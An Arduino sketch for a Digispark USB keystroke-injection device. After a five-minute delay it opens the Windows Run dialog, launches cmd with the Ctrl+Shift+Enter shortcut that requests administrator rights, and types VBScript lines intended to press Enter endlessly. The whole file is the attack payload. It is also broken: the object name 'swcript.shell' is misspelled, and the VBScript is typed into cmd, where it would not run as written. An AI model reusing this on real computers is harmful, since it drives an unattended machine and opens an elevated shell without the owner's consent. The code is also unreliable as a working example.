#include<DigiKeyboard.h>
void setup() {
  // put your setup code here, to run once:

}

void loop() {
  // this program will send key Enter to the computer in loop
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(300000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(300);
  DigiKeyboard.print("cmd");
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
  DigiKeyboard.delay(2000);
  DigiKeyboard.println("set wshShell=wscript.CreateObject('swcript.shell')");
  DigiKeyboard.delay(400);
  DigiKeyboard.println("do");
  DigiKeyboard.delay(400);
  DigiKeyboard.println("wscript.sleep 100");
  DigiKeyboard.delay(400);
  DigiKeyboard.println("wshshell.sendkeys '~(enter)' ");
  DigiKeyboard.delay(400);
  DigiKeyboard.println("loop");
  digitalWrite(1, HIGH);
  for(;;){
    // Zzzzzzzzzz
  }

}
